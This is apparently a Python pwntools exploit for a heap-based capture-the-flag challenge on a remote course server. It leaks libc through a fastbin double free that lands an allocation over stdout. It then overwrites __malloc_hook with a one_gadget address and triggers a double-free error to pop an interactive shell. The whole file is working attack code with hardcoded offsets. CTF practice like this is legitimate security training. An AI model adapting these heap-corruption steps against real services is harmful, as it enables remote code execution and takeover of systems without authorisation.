from pwn import *

context.arch = 'amd64'

###Utils
def new(sz,data):
    r.sendlineafter('> ','1')
    r.sendlineafter('size: ',str(sz))
    r.sendafter('content: ',data)

def prnt(idx):
    r.sendlineafter('> ','2')
    r.sendlineafter('index: ',str(idx))
    return r.recvline()[:-1]

def rmv(idx):
    r.sendlineafter('> ','3')
    r.sendlineafter('index: ',str(idx))

r = remote('csie.ctf.tw',10133)

###Useful Address
stdout_offset = 0x3c4620   #strange, why this one?
one_gadget = 0xef6c4    #rsp+0x50 will always be 0 in doublefree handler :)
leak_stdout = 0x601ff5
malloc_hook_block_offset = 0x3c3b10-0x28+0x5

###Leak libc_base
new(0x68,'a')
new(0x68,'b')
rmv(0)
rmv(1)
rmv(0)
new(0x68,p64(leak_stdout))
new(0x68,'d')
new(0x68,'e')
new(0x68,'f'*27)
stdout_addr = u64(prnt(5)[27:].ljust(8,b'\x00'))
libc_base = stdout_addr-stdout_offset

###Hijack malloc_hook
rmv(0)
rmv(1)
rmv(0)
new(0x68,flat(malloc_hook_block_offset+libc_base))
new(0x68,'d')
new(0x68,'e')
new(0x68,b'f'*3+p64(0)*2+p64(one_gadget+libc_base))
###Double free    #double free mallocs a block to write error message
rmv(0)
rmv(0)

r.interactive()
